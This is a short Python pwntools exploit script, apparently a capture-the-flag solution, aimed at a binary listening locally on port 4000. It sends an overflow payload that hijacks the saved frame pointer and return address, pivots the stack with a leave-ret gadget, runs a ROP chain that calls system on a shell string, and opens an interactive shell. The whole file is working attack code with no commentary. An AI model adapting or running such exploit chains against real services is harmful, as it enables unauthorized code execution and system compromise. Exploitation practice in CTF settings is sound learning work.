#!/usr/bin/python
from pwn import *

s = remote('127.0.0.1',4000)  #for local testing

buf = 0x602000 - 0x100
main_read = 0x400582
pop_rdi_ret = 0x400623
system = 0x400430
sh = 0x400645
leave_ret = 0x4005b2

s.sendline('A'*44 + '\x2c\x00\x00\x00' + p64(buf+0x80) + p64(main_read))

s.sendline('A'*7 + p64(pop_rdi_ret) + p64(sh) + p64(system) + 'A'*12 + '\x2c\x00\x00\x00' + p64(buf+0x80-0x30) + p64(leave_ret))

s.interactive()
